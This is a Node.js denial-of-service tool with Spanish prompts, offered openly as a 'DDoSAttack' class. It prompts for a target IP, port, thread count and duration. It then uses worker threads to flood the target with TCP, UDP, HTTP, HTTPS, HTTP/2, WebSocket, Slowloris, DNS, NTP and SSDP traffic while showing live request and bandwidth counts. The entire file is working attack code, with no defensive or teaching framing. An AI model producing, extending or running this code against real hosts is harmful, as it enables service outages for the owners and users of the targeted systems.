#!/usr/bin/env node
'use strict';

const net = require('net');
const dgram = require('dgram');
const http = require('http');
const https = require('https');
const http2 = require('http2');
const WebSocket = require('ws');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const { performance } = require('perf_hooks');
const readline = require('readline');
const chalk = require('chalk');
const { randomBytes, randomFillSync } = require('crypto');

class DDoSAttack {
    constructor() {
        this.stats = { total: 0, success: 0, failed: 0, bandwidth: 0, start: 0 };
        this.config = { workers: [], anim: ['⠋','⠙','⠹','⠸','⠼','⠴','⠦','⠧','⠇','⠏'] };
        this.running = false;
    }

    async init() {
        this.target = await this.ask(chalk.greenBright('IP objetivo: '));
        this.port = parseInt(await this.ask(chalk.greenBright('Puerto objetivo: ')));
        
        const hilos = await this.ask(chalk.greenBright('Hilos (500-2000): '));
        this.threads = Math.min(parseInt(hilos, 10) || 500, 2000);
        
        const duracion = await this.ask(chalk.greenBright('Duración (segundos): '));
        this.duration = Math.min(parseInt(duracion, 10) || 60, 1800);
        
        const metodos = await this.ask(
            chalk.greenBright('Métodos (separar por coma):\n') +
            chalk.yellow('TCP, UDP, HTTP, HTTPS, HTTP2, WEBSOCKET, SLOWLORIS, DNS, NTP, SSDP\n') +
            chalk.greenBright('Enter para todos: ')
        );
        this.methods = metodos ? metodos.toUpperCase().split(',').map(m => m.trim()) : [];
        
        this.generatePayloads();
    }

    ask(prompt) {
        return new Promise(resolve => {
            const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
            rl.question(prompt, answer => { rl.close(); resolve(answer); });
        });
    }

    generatePayloads() {
        const createPayload = size => {
            const buf = Buffer.alloc(size);
            randomFillSync(buf);
            return buf;
        };

        this.payloads = {
            tcp: createPayload(1024),
            udp: createPayload(65507),
            http: this.createHttpHeaders(),
            dns: this.createDnsPacket(),
            ntp: this.createNtpPacket(),
            ssdp: this.createSsdpPacket()
        };
    }

    createHttpHeaders() {
        return `GET /${randomBytes(8).toString('hex')} HTTP/1.1\r\nHost: ${this.target}\r\n` +
               `User-Agent: ${['Mozilla/5.0 (Windows NT 10.0)', 'Mozilla/5.0 (Linux)', 'Mozilla/5.0 (iPhone)'][Math.floor(Math.random() * 3)]}\r\n` +
               `X-Forwarded-For: ${Array.from({length:4}, () => Math.floor(Math.random() * 255)).join('.')}\r\n\r\n`;
    }

    createDnsPacket() {
        const domain = randomBytes(8).toString('hex') + '.com';
        return Buffer.from([0xAA, 0xAA, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, domain.length, ...Buffer.from(domain), 0x00, 0x00, 0x01, 0x00, 0x01]);
    }

    createNtpPacket() {
        return Buffer.from([0x1B, ...Buffer.alloc(47)]);
    }

    createSsdpPacket() {
        return Buffer.from('M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n');
    }

    start() {
        if (this.running) return;
        this.running = true;
        this.stats.start = performance.now();
        
        console.log(chalk.green('\n[+] Iniciando ataque...'));
        this.launchWorkers();
        this.showStats();
        setTimeout(() => this.stop(), this.duration * 1000);
    }

    launchWorkers() {
        const cores = require('os').cpus().length;
        const threadsPerWorker = Math.ceil(this.threads / cores);
        
        for (let i = 0; i < cores; i++) {
            const worker = new Worker(__filename, {
                workerData: { 
                    target: this.target,
                    port: this.port,
                    payloads: this.payloads,
                    methods: this.methods.length ? this.methods : ['TCP','UDP','HTTP','HTTPS','HTTP2','WEBSOCKET','SLOWLORIS','DNS','NTP','SSDP'],
                    threads: threadsPerWorker
                }
            });
            
            worker.on('message', msg => this.updateStats(msg));
            this.config.workers.push(worker);
        }
    }

    updateStats({ total, success, failed, bw }) {
        this.stats.total += total;
        this.stats.success += success;
        this.stats.failed += failed;
        this.stats.bandwidth += bw;
    }

    showStats() {
        if (!this.running) return;
        const elapsed = (performance.now() - this.stats.start) / 1000;
        const frame = this.config.anim[Math.floor(elapsed * 10) % 10];
        const rps = (this.stats.total / elapsed || 0).toFixed(0);
        const bw = (this.stats.bandwidth / 1024 ** 3).toFixed(3);
        
        process.stdout.write(chalk`\r{green ${frame}} ` +
            chalk`T: {greenBright ${elapsed.toFixed(1)}s} ` +
            chalk`Req: {cyan ${this.stats.total}} ` +
            chalk`SPS: {cyan ${rps}} ` +
            chalk`BW: {cyan ${bw}GB} ` +
            chalk`({green ${this.stats.success}}|{red ${this.stats.failed}})`);
            
        setTimeout(() => this.showStats(), 100);
    }

    stop() {
        if (!this.running) return;
        this.running = false;
        this.config.workers.forEach(w => w.terminate());
        console.log(chalk`\n\n{yellow [!] Ataque detenido}\n`);
        process.exit();
    }
}

if (isMainThread) {
    const attack = new DDoSAttack();
    attack.init().then(() => {
        attack.start();
        process.stdin.on('data', data => {
            if (data.toString().trim().toLowerCase() === 'stop') attack.stop();
        });
    });
} else {
    const { target, port, payloads, methods, threads } = workerData;
    
    const attackMethods = {
        TCP: () => {
            const socket = new net.Socket();
            socket.connect(port, target, () => {
                socket.write(payloads.tcp);
                report('success', payloads.tcp.length);
                socket.destroy();
            }).on('error', () => report('failed', 0));
        },
        
        UDP: () => {
            const socket = dgram.createSocket('udp4');
            socket.send(payloads.udp, port, target, (err) => {
                err ? report('failed', 0) : report('success', payloads.udp.length);
                socket.close();
            });
        },
        
        HTTP: () => {
            const req = http.get(`http://${target}:${port}`, { headers: payloads.http }, () => {
                report('success', 0);
            }).on('error', () => report('failed', 0));
        },
        
        HTTPS: () => {
            const req = https.get(`https://${target}:${port}`, { rejectUnauthorized: false }, () => {
                report('success', 0);
            }).on('error', () => report('failed', 0));
        },
        
        HTTP2: () => {
            const client = http2.connect(`https://${target}:${port}`, { rejectUnauthorized: false });
            const req = client.request({ ':path': '/' });
            req.on('data', () => {});
            req.on('end', () => report('success', 0));
            req.end();
        },
        
        WEBSOCKET: () => {
            const ws = new WebSocket(`ws://${target}:${port}`);
            ws.on('open', () => {
                ws.send(payloads.tcp);
                report('success', payloads.tcp.length);
                ws.close();
            }).on('error', () => report('failed', 0));
        },
        
        SLOWLORIS: () => {
            const socket = net.connect(port, target);
            socket.write('GET / HTTP/1.1\r\nHost: localhost\r\n\r\n');
            const timer = setInterval(() => {
                socket.write(`X-${randomBytes(2).toString('hex')}: ${Math.random()}\r\n`);
            }, 15000);
            socket.on('error', () => clearInterval(timer));
        },
        
        DNS: () => {
            const socket = dgram.createSocket('udp4');
            socket.send(payloads.dns, port, target, (err) => {
                err ? report('failed', 0) : report('success', payloads.dns.length);
                socket.close();
            });
        },
        
        NTP: () => {
            const socket = dgram.createSocket('udp4');
            socket.send(payloads.ntp, port, target, (err) => {
                err ? report('failed', 0) : report('success', payloads.ntp.length);
                socket.close();
            });
        },
        
        SSDP: () => {
            const socket = dgram.createSocket('udp4');
            socket.send(payloads.ssdp, port, target, (err) => {
                err ? report('failed', 0) : report('success', payloads.ssdp.length);
                socket.close();
            });
        }
    };

    function report(type, bw) {
        parentPort.postMessage({
            total: 1,
            success: type === 'success' ? 1 : 0,
            failed: type === 'failed' ? 1 : 0,
            bw: bw
        });
    }

    setInterval(() => {
        for (let i = 0; i < threads * 10; i++) {
            methods.forEach(method => {
                if (attackMethods[method]) attackMethods[method]();
            });
        }
    }, 100);
}